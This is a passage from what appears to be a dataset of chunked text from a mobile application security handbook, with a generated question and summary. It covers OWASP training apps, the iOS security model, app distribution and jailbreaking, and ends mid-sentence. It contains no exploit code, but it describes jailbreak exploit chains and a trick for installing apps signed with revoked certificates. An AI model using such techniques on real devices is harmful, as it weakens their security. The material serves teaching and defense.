self-contained training environment for Android\napplications. The environment provides two sample implementations to hone your skills: FourGoats, a\nlocation-based social network, and Herd Financial, a fictional mobile banking application. Between them,\nthese two projects provide broad coverage for most of the OWASP Top 10 Mobile Risks and are a good\nstarting point for beginners in Android application security.\niGoat (https://www.owasp.org/index.php/OWASP_iGoat_Project) —Similar to the GoatDroid project, iGoat\nis a training application for improving your iOS assessment knowledge. The project is developed by Ken van\nWyk, Jonathan Carter, and Sean Eidermiller and is open source (https://code.google.com/p/owasp-igoat/).\nIt provides both a server and client application with a number of exercises covering important topics such as\nlocal storage, the key chain, SQL injection, and more.\nDamn Vulnerable iOS (https://www.owasp.org/index.php/OWASP_DVIA) —This project, created by Prateek\nGianchandani, provides another vulnerable iOS application for training purposes. In conjunction with the\niGoat project, the two applications provide good coverage of the OWASP Top 10 Mobile Risks. The\napplication is comprised of several challenges that you can complete to further your understanding,\nincluding topics that are omitted from iGoat such as jailbreak detection, runtime manipulation, patching,\nand cryptography.\nMobiSec (https://www.owasp.org/index.php/Projects/OWASP_Mobile_Security_Project_–\n_MobiSec)—MobiSec is a live environment for penetration testing mobile applications; it is created by Tony\nDeLaGrange and Kevin Johnson. The idea behind the project is to provide a single resource to host and\nmaintain the latest versions of all the individual tools you might need during a mobile application\nassessment, in a similar way to other live distributions such as the popular Kali Linux, but in this case\nspecifically focused on mobile security.\nAndroick (https://www.owasp.org/index.php/Projects/OWASP_Androick_Project)—This project addresses\na slightly different topic from the other projects and is focused on automating forensic analysis tasks for\nAndroid applications rather than penetration testing or self-learning. The project, created by Florian\nPradines, automates the retrieval of key forensic artifacts such as APKs, application data, databases, and logs\nfrom the device.\nOf course, you will encounter and even require many other tools during your adventures in mobile application\nsecurity and we document many of these in later chapters. However, the OWASP projects are particularly useful\nfor self-learning as they’re well documented, open source, and specifically developed to provide coverage for the\nTop 10 Mobile Risks project, so we certainly recommend them as a starting point for beginners.\nThe Future of Mobile Application Security\nThe explosive rate at which smartphones and mobile applications have been adopted over the past five years has\nshown no signs of diminishing, and we expect this trend to continue in the future. The consequence of the\ngrowing mobile revolution will only place further emphasis on understanding the security threats that mobile\ndeployments face as well as effective ways of addressing them. We do not believe the current threats to mobile\nsecurity are at present well understood, particularly in the development communities. As such, we expect that\nclassic vulnerabilities such as insecure data storage and insufficient transport security will continue to be\nprevalent for the immediate future.\nThat said, mobile application security is a continually evolving landscape and we fully expect new categories of\nattacks to arise following advances in mobile technologies. The introduction of new hardware components such\nas fingerprint sensors and increased adoption in existing technologies such as NFC will undoubtedly lead to the\ndiscovery of new vulnerabilities, particularly when deployed into environments such as mobile payment\nprocessing, as used by Google Wallet and Apple Pay.\nAs with other areas of software and particularly those that are used to facilitate monetary transactions,\ncriminals will seek to take advantage of vulnerabilities for financial gain. We have already seen an increase in\nbanking malware and premium-rate SMS fraud and expect this trend to continue. This increase has already\nsomewhat altered the threat landscape and in response, some application developers have begun to employ\nbinary protections to defend against these threats. As awareness of these threats matures, the adoption of such\nprotections will likely increase in prominence, along with the use of technologies such as two-factor\nauthentication.\nIt is also likely that the evolution of cross-platform mobile applications will continue as developers aim to\nreduce fragmentation across the various mobile platforms. This has been witnessed in the growth of two\ndevelopment trends:\nBrowser-based applications—This term describes applications that are usually a “mobile friendly” clone\nof the main site and loaded via the device’s browser.\nHybrid applications—This term refers to mobile applications that are a native wrapper for a webview and\noften use a framework to access native device functionality.\nTo complement these trends a large number of both commercial and freely available frameworks have been\ncreated, each with its own quirks and intricacies that can lead to a variety of different vulnerabilities. As with\nmost changes in technology, these trends have brought with them new attacks and variations on existing\nattacks; we examine the security implications of these and similar ones in Chapter 18.\nDespite all the changes in mobile applications no signs exist that the classic attacks are diminishing. A positive\nstep toward addressing this, however, is raising awareness of mobile security threats and vulnerabilities through\ndocumentation, classification, and demonstrations such as those being developed by OWASP. Through this and\nsimilar projects we believe that awareness of mobile security can mature and help to provide development\ncontrols to reduce the number of mobile application vulnerabilities.\nSummary\nOver the past five years the increased popularity of the modern smartphone has contributed to a surge in third-\nparty application development. Enhancements in smartphone hardware have helped applications rapidly evolve\nfrom simple standalone applications to feature rich offerings that can integrate into multiple online\ntechnologies. During this evolution several technical, economic, and development-related features have\ncontributed to bring about a weak security posture demonstrated by many of today’s mobile applications.\nIn addition to the traditional input-based security problems that can affect all types of applications, mobile\napplications are also affected by several relatively unique vulnerabilities due to the nature in which they are\nused. These issues are often not well understood by developers and can lead to attacks when a device is used on\nan untrusted network, when a device is lost or stolen, or even from other components on the mobile platform.\nResearch on the current state of mobile security has shown that application vulnerabilities are not well\nunderstood and that the majority of applications are vulnerable to attack. Furthermore, the evolution of new\ntechnologies and integrations is likely to produce entirely new attacks, which could pose a serious threat to\norganizations that do not react and adapt accordingly.",
    "question": "What are the key security vulnerabilities and risks associated with mobile applications, and how do they differ from traditional web and desktop application security concerns?",
    "summary": "Mobile applications have become essential in modern life, offering a wide range of functionalities but often lacking proper security. Many mobile apps are vulnerable to issues like insecure data storage, weak server controls, and client-side injection, which can lead to data breaches and device compromise. The OWASP Mobile Security Project highlights these risks and provides tools to help developers identify and mitigate them, while the future of mobile security will continue to evolve with new technologies and threats."
  },
  {
    "start": 8,
    "end": 11,
    "text": "CHAPTER 2\nAnalyzing iOS Applications\nApple’s iOS, the platform used by today’s iPhone, iPad, and iPod touch devices, is one of the most popular\nmobile operating systems available. For this reason, and with the possible exception of Android, it is the\nplatform that is targeted the most by hackers and comes under the greatest scrutiny for application layer\nvulnerabilities.\nWith more than one million applications in Apple’s App Store, the attack surface is significant. Numerous\nexamples of application-based security flaws have been documented, affecting a wide range of applications\nincluding but not limited to those used in banking, retail, and enterprise environments.\nThis chapter introduces the iOS platform and the ecosystem and provides an introduction to iOS applications. It\nsets out in detail the practical steps you can follow to build an environment suitable for testing and exploiting\niOS applications. Finally, it describes the ways in which you can begin to analyze and modify iOS applications to\nidentify security flaws.\nUnderstanding the Security Model\nBefore delving into the inner working of iOS applications and the techniques you can use to attack them,\nunderstanding the fundamental security features of the iOS platform itself is important. This not only provides\ncontext to application-based vulnerabilities, but also highlights some of the opt-in features that applications can\ntake advantage of to improve security.\nThe core security features of the iOS platform are summarized here:\nSecure boot chain\nCode signing\nProcess-level sandboxing\nData-at-rest encryption\nGeneric native language exploit mitigations:\n1. Address space layout randomization\n2. Non-executable memory\n3. Stack-smashing protection\nApple combines these security technologies, which are implemented as either hardware or software\ncomponents, to improve the overall security of iPhone, iPad, and iPod devices. These security features are\npresent on all non-jailbroken devices and you should take them into consideration when you are assigning risk\nratings to application-based vulnerabilities. Some of these features are documented in the blog post by MDSec\nat http://blog.mdsec.co.uk/2012/05/introduction-to-ios-platform-security.html.\nInitializing iOS with Secure Boot Chain\nThe Secure Boot Chain is the term used to describe the process by which the firmware is initialized and loaded\non iOS devices at boot time, and it can be considered the first layer of defense for the security of the platform. In\neach step of the Secure Boot Chain, each of the relevant components that have been cryptographically signed by\nApple is verified to ensure that it has not been modified.\nWhen an iOS device is turned on, the processor executes the boot ROM, which is a read-only portion of code\nthat is contained within the processor and is implicitly trusted by the device; it is burned onto the chip during\nmanufacturing. The boot ROM contains the public key for Apple’s Root CA, which is used to verify the integrity\nof the next step of the Secure Boot Chain, the low-level bootloader (LLB).\nThe LLB performs a number of setup routines, including locating the iBoot image in flash memory before\nbooting from it. The LLB looks to maintain the Secure Boot Chain, shown in Figure 2.1, by verifying the\nsignature of the iBoot image, and if the signature does not match the expected value, the device boots into\nrecovery mode. iBoot, which is the second-stage bootloader, is responsible for verifying and loading the iOS\nkernel, which in turn goes on to load the usermode environment and the OS which you will no doubt be familiar\nwith.\nFigure 2.1 The secure boot chain\nIntroducing the Secure Enclave\nThe Secure Enclave is a coprocessor shipped with A7 and A8 chip devices (iPhone 6, iPhone 5s, iPad Air, and\niPad Mini second generation at the time of writing) that uses its own secure boot and software update processes,\nindependent from the main application processor. The Secure Enclave handles cryptographic operations on the\ndevice, specifically the key management for the Data Protection API and Touch ID fingerprint data. The Secure\nEnclave uses a customized version of the ARM TrustZone\n(http://www.arm.com/products/processors/technologies/trustzone/index.php) to partition itself from the\nmain processor and provide data integrity even if the device’s kernel becomes compromised. In short, this\nmeans that if the device is jailbroken or otherwise compromised, extracting cryptographic material such as\nbiometric fingerprint data from the device should be impossible. For further information about the Secure\nEnclave, please refer to the whitepaper release by Apple\n(http://www.apple.com/ca/ipad/business/docs/iOS_Security_Feb14.pdf).\nRestricting Application Processes with Code Signing\nCode signing is perhaps one of the most important security features of the iOS platform. It is a runtime security\nfeature of the platform that attempts to prevent unauthorized applications from running on the device by\nvalidating the application signature each time it is executed. Additionally, code signing ensures that applications\nmay execute only code signed by a valid, trusted signature; for example, any attempt made to execute pages in\nmemory from unsigned sources will be rejected by the kernel.\nFor an application to run on an iOS device, it must first be signed by a trusted certificate. Developers can install\ntrusted certificates on a device through a provisioning profile that has been signed by Apple. The provisioning\nprofile contains the embedded developer certificate and set of entitlements that the developer may grant to\napplications. In production applications, all code must be signed by Apple, a process initiated by performing an\nApp Store submission. This process allows Apple some control over applications and the APIs and functionality\nused by developers. For example, Apple looks to prevent applications that use private APIs or applications that\ndownload and install executable code, thus preventing applications from upgrading themselves. Other actions\nthat Apple deems as banned or potentially malicious will similarly result in application submissions being\nrejected from the App Store.\nIsolating Applications with Process-Level Sandboxing\nAll third-party applications on iOS run within a sandbox, a self-contained environment that isolates applications\nnot only from other applications but also from the operating system. Sandboxing introduces significant security\nto the platform and limits the damage that malware can do, assuming a malicious application has subverted the\nApp Store review process.\nAlthough all applications run as the mobile operating system user, each application is contained within its own\nunique directory on the filesystem and separation is maintained by the XNU Sandbox kernel extension. The seat\nbelt profile governs the operations that can be performed in the sandbox. Third-party applications are assigned\nthe container profile, which generally limits file access to the application home tree (top-level and all\nsubsequent directories), and with some exceptions, unrestricted access to outbound network connections. Since\niOS7, the seat belt container profile has been made much more prohibitive and for an application to access\nthings like media, the microphone, and the address book, it must request the relevant permissions from the\nuser. This means that assuming a piece of malware has bypassed the App Store review process, it would not be\nable to steal your contacts and photos unless you grant it the relevant permissions.\nProtecting Information with Data-at-Rest Encryption\nBy default, all data on the iOS filesystem is encrypted using block-based encryption (AES) with the filesystem\nkey, which is generated on first boot and stored in block 1 of the NAND flash storage. The device uses this key\nduring the startup process to decrypt the partition table and the system partition. The filesystem is encrypted\nonly at rest; when the device is turned on, the hardware-based crypto accelerator unlocks the filesystem. iOS\nleverages this key to implement the device’s remote wipe capability because destroying the filesystem key\ncauses the filesystem to become unreadable.\nIn addition to the hardware encryption, individual files and keychain items can be encrypted using the Data\nProtection API, which uses a key derived from the device passcode. Consequently, when the device is locked,\nitems encrypted using the Data Protection API in this way will be inaccessible, and upon unlocking the device by\nentering the passcode, protected content becomes available.\nThird-party applications needing to encrypt sensitive data should use the Data Protection API to do so. However,\nconsideration should be given for background processes in how they will behave if necessary files become\nunavailable due to the device becoming locked. For in-depth details on how the Data Protection API works\nconsult the later section in this chapter, “Understanding the Data Protection API.”\nProtecting Against Attacks with Exploit Mitigation Features\nThe iOS platform employs a number of modern-day exploit mitigation technologies to increase the complexity\nof attacks against the device.\nPerhaps one of the most important of these protections is the implementation of the write but not execute\n(W^X) memory policy, which states that memory pages cannot be marked as writeable and executable at the\nsame time. This protection mechanism is applied by taking advantage of the ARM processor’s Execute Never\n(XN) feature. As part of this policy, executable memory pages that are marked as writeable cannot also be later\nreverted to executable. In many ways this is similar to the Data Execution Protection (DEP) features\nimplemented in Microsoft Windows, Linux, and Mac OS X desktop OSs.\nAlthough non-executable memory protections alone can be easily bypassed using return-oriented programming\n(ROP)–based payloads, the complexity of exploitation is significantly increased when compounded with ASLR\nand mandatory code signing.\nAddress space layout randomization (ASLR) is an integral part of the platform’s exploit mitigation features and\nlooks to randomize where data and code are mapped in a process’ address space. By randomizing code locations,\nexploitation of memory corruption vulnerabilities becomes significantly more complex. This makes techniques\nto bypass non-executable memory like ROP difficult because attackers are unlikely to know the location of the\nportions of code that they want to reuse in their ROP gadget chain.\nASLR was first introduced to iOS in version beta 4.3 and since its implementation it has gradually improved\nwith each release. The primary weakness in the early ASLR implementations was the lack of relocation of the\ndynamic linker (dyld); this was addressed with the release of iOS 5.0. However, a number of techniques can\nweaken its effectiveness, the most common of which is making use of memory disclosure bugs. This generally\ninvolves using a separate vulnerability to leak the contents or confirm memory layout in an effort to make\nexploitation attempts much more likely to succeed.\nApplications can have ASLR applied in two different flavors: either partial ASLR or full ASLR, depending on\nwhether they have been compiled with support for position-independent execution (PIE). In a full ASLR\nscenario, all the application memory regions are randomized and iOS will load a PIE-enabled binary at a random\naddress each time it is executed. An application with partial ASLR will load the base binary at a fixed address and\nuse a static location for the dyld. Although now dated, an in-depth assessment of ASLR in iOS has been\nconducted by Stefan Esser and is recommended reading for those looking to gain a greater understanding\n(http://antid0te.com/CSW2012_StefanEsser_iOS5_An_Exploitation_Nightmare_FINAL.pdf).\nA further protection mechanism that iOS applications can take advantage of is “stack-smashing” protection. This\ncompiler-based exploit mitigation offers some defense against traditional stack-based overflow exploits by\nintroducing stack canaries. Stack canaries are pseudo-random DWORD values that are inserted behind local\nvariables. Stack canaries are checked upon return of the function. If an overflow has occurred and the canary\nhas been corrupted or overwritten entirely, the application will forcibly terminate to prevent any unintended\nbehavior that may be brought on by the memory corruption.\nUnderstanding iOS Applications\nAlthough more than a million iOS applications exist in the App Store alone, at a high level one can categorize all\niOS applications into three main groups:\nStandard native applications\nBrowser-based applications\nHybrid applications\nTraditional standard native applications are the most common of iOS applications, and these are developed in\nObjective-C or more recently in Swift. Objective-C is an object-orientated programming language that adds\nSmalltalk-style messaging to the C programming language, whereas Swift is Apple’s new multi-paradigm\nprogramming language that is likely to replace Objective-C in the long term. Both are discussed in greater detail\nlater in this chapter. Because Objective-C is a strict superset of C, seeing native applications developed in a\nmixture of Objective-C, C, or even C++ is not uncommon. These applications are compiled to native code and\nlinked against the iOS SDK and Cocoa Touch frameworks. Programming in Objective-C and Swift is beyond the\nscope of this book; however, knowledge of these languages and their basic principles will be beneficial to your\nunderstanding. If you have never seen any Objective-C or Swift code before, we recommend that you familiarize\nyourself with these languages; the documentation provided by the Apple developer program is a useful starting\npoint (specifically\nhttps://developer.apple.com/library/prerelease/mac/documentation/Swift/Conceptual/Swift_Programming_Language/index.html#//apple_ref/doc/uid/TP40014097-\nCH3-XID_0 and\nhttps://developer.apple.com/library/mac/documentation/cocoa/conceptual/ProgrammingWithObjectiveC/Introduction/Introduction.html\nBrowser-based applications are the “mobile-friendly” clone of a web application. These applications are\nspecifically customized to render in iOS web views and are typically loaded via MobileSafari. Browser-based\napplications use traditional web technologies, including HTML, JavaScript, and Cascading Style Sheets. You\nshould approach browser-based applications using traditional web application security methodologies; they are\nnot covered in any great detail within this book.\nHybrid applications are a cross between standard native and browser-based applications. Typically, hybrid\napplications are deployed with a native wrapper that is used to display one or more browser-based applications\nthrough use of a mobile web view. Hybrid applications also include those used as part of a Mobile Enterprise\nApplication Platform deployment and are discussed in greater detail in Chapter 18. Hybrid applications offer the\nadvantages of both native and browser-based applications; these include the flexibility for real-time updates,\nbecause HTML and JavaScript applications are not constrained by code signing, as well as native device\nfunctionality such as camera access, through JavaScript to Objective-C bridge APIs.\nDistribution of iOS Applications\nThis section covers the different official methods by which developers can distribute iOS applications to devices;\nnamely the Apple App Store and the official Apple developer program.\nApple App Store\nThe Apple App Store has been mentioned on several occasions so far in this book and aside from being the\nstandard method of application distribution, it’s also the one with which most people are familiar.\nThe App Store is the official distribution market for iOS applications where users can search and browse for\ndownloadable applications. Applications in the App Store are developed using Apple’s iOS SDK and are targeted\nfor iPhone and iPod touch or iPad devices. The majority of applications in the App Store are created by third-\nparty publishers and can be downloaded for free or a fixed cost.\nBefore developers can publish an application they must have an Apple Developer account and be a member of\nthe iOS Developer Program. Being a member of this program entitles you to obtain a developer certificate that\ncan be used to code sign applications and run them on up to 100 different iOS devices using an ad hoc\nprovisioning profile. Apple permits ad hoc distribution in this way to provide third-party developers a means to\ntest their applications on real devices. Developers wanting to distribute their application can submit a copy\nsigned using their certificate to Apple, who will validate the application based on their App Store approval\nprocess. Although the exact details of this process are unknown, it is believed to contain both manual and\nautomated testing of the application to identify functional and usability defects and ensure the application\nconforms with the App Store review guidelines\n(https://developer.apple.com/appstore/resources/approval/guidelines.html). As part of this process the\napplication is strictly vetted for malicious content such as attempting to steal the address book or using private\nAPIs that are reserved for system applications; such behavior would result in App Store rejection.\nEnterprise Distribution\nThe iOS enterprise developer program allows organizations to develop and distribute in-house applications to\ntheir employees. This is typically used by organizations that have internal applications that they do not want to\nbe available in the App Store. Users in the enterprise developer program can obtain and use a code signing\ncertificate in a similar way to that used for ad hoc distribution. However, the significant difference between\nenterprise distribution and ad hoc distribution is that there is no limitation on the number of devices that an\napplication can be code signed for. This has obvious possibilities for abuse and therefore Apple performs\nadditional validation of users wanting to enter this program: A developer must have a legitimate business along\nwith a Dun and Bradsheet number to enroll.\nHowever, some cases exist where enterprise certificates have been abused, the most notable being the GBA4iOS\napplication, a Game Boy Advanced emulator (http://www.gba4iosapp.com/). This application uses an expired\nenterprise certificate to allow users to install an application that would not normally be accepted by the App\nStore. Although the certificate has since been revoked by Apple, a loophole exists whereby setting the device’s\ndate back to before the date of revocation will allow it to be installed. This technique was also used by the Pangu\njailbreak (http://en.pangu.io/) as a means of side loading the jailbreak application to the device to gain initial\ncode execution.\nApplication Structure\niOS applications are distributed as an iOS App Store package (IPA) archive, a compressed package containing the\nnecessary compiled application code, resources, and application metadata required to define a complete\napplication. These packages are nothing more than a Zip file and can be decompressed to reveal the expected\nstructure, as shown here:\nPayload\nPayload/Application.app\niTunesArtwork\niTunesMetadata.plist\nThe Payload folder is where all the application data is located, including the compiled application code and any\nassociated static resources, all stored within a folder named after the application and suffixed with the .app\nextension. The iTunesArtwork file is a 512 x 512-pixel Portable Network Graphics (PNG) image used as the\napplication’s icon in iTunes and the App Store. The iTunesMetadata.plist contains the relevant application\nmetadata, including details such as the developer’s name, bundle identifier, and copyright information.\nInstalling Applications\nA number of methods can be used to install the IPA package on the device, the most common and the one you\nare most likely familiar with is by using iTunes. iTunes is the Apple media player that you can use to manage\nyour application and media library for OS X and Microsoft Windows operating systems as well as to synchronize\ncontent from your iOS device. Using iTunes you can download applications from the App Store and synchronize\nthem to your device. You can also use it for installing enterprise or ad hoc builds, where the latter assumes the\ncorresponding provisioning profile is installed. iOS application developers are likely to have used Apple’s Xcode\nintegrated development environment (IDE) to build and install applications. When compiling an application\nfrom source, you can use Xcode to build, install, and debug an application on a device. It also provides a drag-\nand-drop interface for installing IPA packages similarly to iTunes, within the Xcode organizer or devices view\ndepending on which version of Xcode you are running. Both of these implementations are proprietary to Apple\nand do not support Linux. However, libimobiledevice, the open source library available for Linux users, provides\nsupport for communicating with iOS devices natively. A suite of tools has been built upon this library and\nprovides Linux users with the necessary software to interact with iOS devices. To install IPA packages to a\ndevice, Linux users can use the ideviceinstaller command.\nThe application installation process occurs over the USB connection, and the relevant installer software is\nrequired to use Apple’s proprietary USB networking system as a transport mechanism. This communication\ntransport is implemented using the USB multiplexing daemon usbmuxd, which provides a TCP-like transport for\nmultiplexing many connections over one USB pipe. An open source implementation is available at\nhttps://github.com/libimobiledevice/usbmuxd, and the iPhone Dev Team has documented an overview of the\nprotocol at http://wikee.iphwn.org/usb:usbmux. On the device, the installd daemon handles the actual\ninstallation process. This daemon is responsible for both unpacking and installing applications as well as\ncompressing and packaging applications transferred to iTunes as part of the device synchronization. Before\nperforming either of these tasks, installd validates the code signature for the application. On jailbroken devices\nyou can circumvent this process using tweaks such as AppSync and using ipainstaller\n(https://github.com/autopear/ipainstaller) to directly install the IPA from the filesystem on the device.\nPrior to 1OS8, when you installed an application, it was placed in the /var/mobile/Applications/ folder using a\nuniversally unique identifier (UUID) to identify the application container. However, the filesystem layout in\niOS8 has changed: the static bundle and the application data folders are stored in separate locations. An\napplication will now typically adhere to the following format:\n/var/mobile/Containers/Bundle/Application/<UUID>/Application.app/\n/var/mobile/Containers/Data/Application/<UUID>/Documents/\n/var/mobile/Containers/Data/Application/<UUID>/Library/\n/var/mobile/Containers/Data/Application/<UUID>/tmp/\nEach of these directories has a unique function within the sandboxed container:\nApplication.app—This folder represents the folder detailed in the “Application Structure” section and\nstores the static content of the application and the compiled binary. This folder should not be written to:\nDoing so invalidates the code signature.\nDocuments—This folder is the persistent data store for the application. The contents of this folder are\nbacked up by iTunes.\nLibrary—This folder contains the application support files; that is, files that are not user data files.\nExamples include configurations, preferences, caches, and cookies. iTunes backs up the contents of this\ndirectory, with the exception of the Caches subdirectory.\ntmp—This folder is used to store temporary files; that is, files that do not need to persist between\napplication launches.\nUnderstanding Application Permissions\nThe introduction of iOS 6 brought a number of new privacy and permission improvements that have been\nrefined with each new release since. Before iOS 6, any iOS application that had undergone App Store approval\nwas able to access your contact lists, photos, and other sensitive data without your knowledge as was the case\nwith the Path application (http://www.wired.com/2012/02/path-social-media-app-uploads-ios-address-\nbooks-to-its-servers/).\nThe permission model on iOS works a little differently than on other mobile platforms: Data is segregated into\nclasses and an application must request permissions from the user to access data from that class. Data is\nbroadly segregated into the following classes:\nLocation services\nContacts\nCalendar\nPhotos\nReminders\nMicrophone access\nMotion activity\nBluetooth access\nSocial media data\nWhen an application requires access to data protected by these privacy classes it must prompt the user to allow\nor deny access. For example, if an application wants access to the device’s address book it must request\npermission from the user as shown here:\nABAddressBookRef addressBookRef = ABAddressBookCreateWithOptions(NULL,\nNULL);\nif (ABAddressBookGetAuthorizationStatus()==\nkABAuthorizationStatusNotDetermined) {\nABAddressBookRequestAccessWithCompletion(addressBookRef, ^(bool granted,\nCFErrorRef error) {\nif (granted) {\n// access is granted\n}\nelse {\n// access is denied\n}\n});\nThis code causes the application to display a privacy prompt as shown in Figure 2.2.\nFigure 2.2 The user sees this privacy prompt when an application tries to access the address book.\nAt this stage the user can either allow or deny the application access to the requested resource. If the request is\ngranted then the application will be allowed access to the resource indefinitely or until the user revokes it via\nthe Privacy settings menu, an example of which is shown in Figure 2.3.\nFigure 2.3 Users can access Privacy settings if they want to grant access to a resource.\nAs you can probably imagine, the privilege model is highly dependent upon user awareness; if the user\nknowingly grants permissions to the application then the application is able to abuse them. One such example\nof this was the “Find and Call” malware (http://securelist.com/blog/incidents/33544/find-and-call-leak-\nand-spam-57/), which evaded the App Store vetting process and after prompting users to allow access to their\naddress books, proceeded to upload the information to a centralized server.\nThe release of iOS 8 saw refinements to the privacy settings, and introduced a new feature that allows the user\nto control when an application can access location information. The possible values are\nThe application is never allowed access to location information.\nThe app is allowed access only while the app is in the foreground and in use.\nThe app can access location information all the time.\nThis additional granularity can prevent a malicious application acting as a tracking device, monitoring a user’s\nmovements in the background, and perhaps shows how Apple may refine access to other data classes in the\nfuture.\nJailbreaking Explained\nOn iOS, access to the device is tightly locked down; a user is unable to get interactive access to the device or\noperating system. In addition, the ecosystem is to an extent governed by Apple and the guidelines of the App\nStore. For this reason, an online community has focused on alleviating these constraints by releasing jailbreaks\nto the public. In a nutshell, jailbreaking removes the limitations in iOS by providing users with root-level access\nto their device. Many misconceptions exist about what jailbreaking your device entails technically. This section\nprovides an insight into jailbreaking, the various terminologies you will encounter, and briefly explains some of\nthe previous public jailbreaks. For an in-depth analysis of the jailbreaking process, review the iOS Hacker’s\nHandbook 10(ISBN 978-1118204122, Miller et al; 2012).\nReasons for Jailbreaking\nPerhaps the most common reason for users to jailbreak a device is to get access to a host of applications that\nwould not meet the compliance checks imposed by the App Store. Jailbreaking your device allows you to install\napplications from unofficial marketplaces such as Cydia. These applications are not restricted by Apple’s\ncompliance vetting and can therefore use banned APIs or perform powerful customization or personalization of\nthe interface.\nA slightly darker side to jailbreaking also exists: piracy. Piracy is a powerful driver for many users. Jailbreaking\nyour device allows you to circumvent the code signing restrictions that prohibit running applications other than\nthose signed by Apple. Jailbroken devices have no such restrictions meaning that you can download and run\ncracked applications that you would normally have to pay for if acquired via Apple’s App Store.\nIn the past, jailbreaking has also given users access to functionality or features that they may not otherwise be\nable to access or be required to pay the carrier for. A good example of this is tethering, which up until the\npersonal hotspot feature was introduced in to iOS was a feature that had to be enabled by the carrier. Indeed,\nthis feature is still only supported on a subset of devices. Furthermore, in the past jailbreaking also provided\nsome users with the ability to carrier unlock their device using utilities such as ultrasn0w\n(http://theiphonewiki.com/wiki/Ultrasn0w).\nAccessing such utilities can be an appealing prospect for many users so it is understandable why people choose\nto jailbreak their devices. However, downsides exist to jailbreaking. By performing a jailbreak the user\nfundamentally weakens the security of the operating system. Jailbreaks create the ability for unsigned code—\nthat is, code that has not been vetted by Apple—to run on the device. The installation of tweaks such as AppSync\nfacilitates the installation of unsigned IPA packages, where the integrity of the creator cannot always be\nvalidated. From a security perspective this is clearly a concern as it opens the device to a number of potential\nrisks, the most obvious being malware. By courtesy of the rigorous vetting performed as part of the App Store\nsubmission process, iOS users have been relatively unaffected by malware to date. There have been few\nexamples of malware affecting non-jailbroken devices. The majority of the identified iOS malware samples have\naffected jailbroken devices only:\niKee—This was the first iPhone worm; it targeted jailbroken devices that had the SSH service running and\nwhere the users had not changed the default credentials for the device. In this instance the malware was\nrelatively benign and simply changed the lock screen background to an image of Rick Astley\n(http://theiphonewiki.com/wiki/Ikee-virus).\niKee.B—This malware compromised devices via the Secure Shell (SSH) service in a similar way as the iKee\nmalware did. However, the intentions of this variant were much more malicious; the malware turned the\ndevice into a bot, communicating back to a Lithuanian-hosted Command and Control (C&C) server. The\nmalware was also reported to redirect Dutch ING Direct customers to a malicious phishing site in order to\nsteal user account information (http://www.f-secure.com/weblog/archives/00001822.html).\nUnflod Baby Panda—In April 2014 a piece of malware believed to have Chinese origins was identified.\nThis malware, nicknamed “Unflod Baby Panda” due to the name of the library, took the form of a Cydia\nSubstrate tweak and hooked key functions from the security framework to steal users’ Apple ID and\npassword. Stefan Esser provides a brief analysis of this malware at\nhttps://www.sektioneins.de/en/blog/14-04-18-iOS-malware-campaign-unflod-baby-panda.html.\nTypes of Jailbreaks\nShortly after the release of the original iPhone in July 2007, people began to focus on jailbreaks. The majority of\nthe released jailbreaks have relied on physical access to the device to achieve initial code execution. These\njailbreaks have required a USB connection and are therefore less likely to be used against an unwitting victim.\nExamples of these types of jailbreaks include the evasi0n jailbreak (http://evasi0n.com/iOS6/), which initially\nexploited an issue in the MobileBackup service, and the Pangu (http://en.pangu.io/) jailbreak that used an\nexpired enterprise certificate to install an application and get initial userland code execution on the device.\nAlthough much less common, several other userland exploits can be triggered remotely, without the knowledge\nof the user—namely the three JailbreakMe exploits, released by comex (https://github.com/comex).\nJAILBREAKME v3 SAFFRON\nThe JailbreakMe v3 Saffron jailbreak, developed by Comex, uses two vulnerabilities to compromise the\ndevice and affects iOS devices earlier than 4.3.4. The jailbreak can be initiated simply by browsing to a web\nserver hosting the exploit in MobileSafari, where the payload is delivered inside a PDF file. The first\nvulnerability (CVE-2011-0226) is an integer signedness issue that occurs while decoding Type 1 fonts and\nresides in the FreeType font engine as used by the CoreGraphics framework. Exploitation of this issue\nprovides the initial code execution, which is a used courtesy of a return-oriented programming (ROP)\npayload to exploit a second vulnerability. The second vulnerability (CVE-2011-0227) exploited by\nJailbreakMe v3 Saffron achieves code execution in the kernel by leveraging a type confusion vulnerability\nin the IOMobileFrameBuffer IOKit interface accessible from within the MobileSafari sandbox. For a\ndetailed write-up of this vulnerability, review the analysis by Sogeti (http://esec-\nlab.sogeti.com/post/Analysis-of-the-jailbreakme- v3-font-exploit). The source code is also available\nfor analysis (https://github.com/comex/star_).\nAt a high level, jailbreaks can be categorized in three ways depending on the type of persistence they provide.\nThe jailbreak community has coined the terms untethered, tethered, and semi-tethered to describe the level of\npersistence on the device a jailbreak affords:\nUntethered jailbreak—This type of jailbreak is the most desirable for users and also the most difficult to\nachieve. It persists on the device across reboots, which has historically been achieved using one of two\ntechniques. The first technique involves the use of a low level bootloader image that is modified to perform\nno validation of the iBoot image, which in turn allows an unsigned kernel to be loaded. This is the same\ntechnique used by jailbreaks that leverage the 0x24000 Segment Overflow vulnerability detailed in\nhttp://theiphonewiki.com/wiki/0x24000_Segment_Overflow. The second technique first uses a userland\nexploit, such as that used by the Corona exploit\n(http://theiphonewiki.com/wiki/Racoon_String_Format_Overflow_Exploit) to initially get arbitrary code\nexecution; a kernel exploit is then subsequently used to patch the kernel and place it into a jailbroken state.\nAs previously noted, an untethered jailbreak persists each time a device is rebooted without the need of any\nadditional exploitation or assistance from a connected computer.\nTethered jailbreaks—This type of jailbreak is not persistent across reboots and requires the assistance of a\ncomputer to start the device. In a tethered jailbreak the kernel is not persistently patched or patched on the\nfly and if the device attempts to boot on its own it can get stuck in recovery mode. Essentially, the device\nmust be re-jailbroken each time it is rebooted or turned on and without this it is essentially useless. An\nexample of a tethered jailbreak is the limera1n exploit by geohot (http://www.limera1n.com/), which affects\nthe device firmware upgrade (DFU) boot ROM in pre-A5 devices by exploiting a heap overflow in the USB\nstack. This jailbreak was particularly powerful because it required a hardware fix to resolve and therefore\nprovided the platform upon which many other untethered jailbreaks were based, such as redsn0w or limera1n\nuntether, which used comex’s packet filter kernel exploit\n(http://theiphonewiki.com/wiki/Packet_Filter_Kernel_Exploit).\nSemi-tethered jailbreaks—These jailbreaks are halfway between untethered and tethered in that although\nthey require the assistance of a computer to start the device into a jailbroken state, rebooting or starting the\ndevice without this assistance is possible, but only into a non-jailbroken state.\nevasi0n JAILBREAK\nThe evasi0n jailbreak affected iOS versions 6.0–6.1.2 and was relatively unique at the time because it was\nable to achieve the initial code execution on the device without the use of any memory corruption\nvulnerabilities. Instead, it uses a series of impressive bypasses and logic bugs to evade the userland exploit\nmitigations to eventually achieve arbitrary code execution. Included in these 